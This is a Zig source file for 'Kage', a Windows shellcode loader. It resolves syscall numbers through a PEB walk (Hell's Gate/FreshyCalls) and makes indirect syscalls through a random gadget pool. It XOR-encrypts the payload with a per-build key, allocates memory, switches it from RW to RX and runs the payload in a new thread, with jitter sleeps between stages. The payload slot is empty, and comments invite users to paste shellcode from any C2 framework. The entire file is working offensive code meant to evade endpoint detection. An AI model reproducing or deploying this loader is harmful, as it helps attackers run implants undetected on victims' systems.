// hells gate shellcode loader. self-injection, per-build random xor key, peb walk.
// FreshyCalls SSN resolution + indirect syscalls with random gadget pool.
const std = @import("std");
const windows = std.os.windows;
const nt = @import("nt.zig");
const syscall = @import("syscall.zig");
const build_options = @import("build_options");

const print = std.debug.print;
// 128-bit per-build xor key injected by build.zig via addOptions.
const key_bytes: [16]u8 = @bitCast(build_options.shellcode_key);

var g_sys: syscall.Syscalls = undefined;

// logging helpers.
fn ok(comptime fmt: []const u8, args: anytype) void {
    print("[+] " ++ fmt ++ "\n", args);
}
fn info(comptime fmt: []const u8, args: anytype) void {
    print("[*] " ++ fmt ++ "\n", args);
}
fn err(comptime fmt: []const u8, args: anytype) void {
    print("[-] " ++ fmt ++ "\n", args);
}

// paste your shellcode bytes here. any c2 framework works.
// encrypted at comptime with the per-build xor key from build.zig.
const shellcode = init: {
    const raw = [_]u8{
        // Paste your shellcode bytes here.
    };
    var encoded: [raw.len]u8 = undefined;
    for (&raw, 0..) |b, i| encoded[i] = b ^ key_bytes[i % key_bytes.len];
    break :init encoded;
};

fn banner() void {
    print(
        \\ Kage - shellcode loader
        \\ Author: JYenn (SISTA)
        \\
    , .{});
}

pub fn main() void {
    banner();

    if (shellcode.len == 0) {
        err("no shellcode embedded, paste your shellcode bytes in main.zig", .{});
        return;
    }

    // resolve syscall SSNs and gadgets via peb walk + FreshyCalls.
    g_sys = syscall.Syscalls.resolve() orelse {
        err("failed to resolve syscalls", .{});
        return;
    };
    ok("syscalls resolved via PEB walk", .{});

    const current_process: windows.HANDLE = nt.NtCurrentProcess;
    var base_addr: ?*anyopaque = null;
    var size: windows.SIZE_T = shellcode.len;

    // allocate RW memory.
    const status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
        g_sys.NtAllocateVirtualMemory.number,
        &[_]usize{
            @intFromPtr(current_process), @intFromPtr(&base_addr), 0,
            @intFromPtr(&size), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE,
        },
        6,
    ))));
    if (!nt.NT_SUCCESS(status)) {
        err("NtAllocateVirtualMemory failed: 0x{X}", .{@as(u32, @bitCast(status))});
        return;
    }
    ok("allocated {d} bytes at 0x{X}", .{ size, @intFromPtr(base_addr) });
    jitter(10, 50);

    // copy encrypted shellcode and decrypt in-place.
    const buffer: [*]u8 = @ptrCast(base_addr);
    @memcpy(buffer[0..shellcode.len], &shellcode);
    for (buffer[0..shellcode.len], 0..) |*b, i| b.* ^= key_bytes[i % key_bytes.len];
    info("shellcode decrypted ({d} bytes, {d}-byte XOR key)", .{ shellcode.len, key_bytes.len });
    jitter(10, 30);

    // rw → rx.
    var old_protect: windows.ULONG = 0;
    _ = syscall.syscall_dispatch(
        g_sys.NtProtectVirtualMemory.number,
        &[_]usize{
            @intFromPtr(current_process), @intFromPtr(&base_addr),
            @intFromPtr(&size), windows.PAGE_EXECUTE_READ, @intFromPtr(&old_protect),
        },
        5,
    );
    ok("memory protected to RX", .{});
    jitter(5, 15);

    // spawn thread at shellcode entry.
    var thread_handle: windows.HANDLE = undefined;
    _ = syscall.syscall_dispatch(
        g_sys.NtCreateThreadEx.number,
        &[_]usize{
            @intFromPtr(&thread_handle), windows.THREAD_ALL_ACCESS, 0,
            @intFromPtr(current_process), @intFromPtr(@intFromPtr(base_addr)), 0,
            0, 0, 0, 0, 0,
        },
        11,
    );
    ok("thread created, waiting for completion", .{});

    _ = syscall.syscall_dispatch(
        g_sys.NtWaitForSingleObject.number,
        &[_]usize{ @intFromPtr(thread_handle), 0, 0 },
        3,
    );
}

// pseudorandom sleep between stages. not crypto, just noise.
fn jitter(min_ms: u64, max_ms: u64) void {
    var interval = windows.LARGE_INTEGER{
        .QuadPart = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000)))),
    };
    _ = syscall.syscall_dispatch(
        g_sys.NtDelayExecution.number,
        &[_]usize{ 0, @intFromPtr(&interval) },
        2,
    );
}
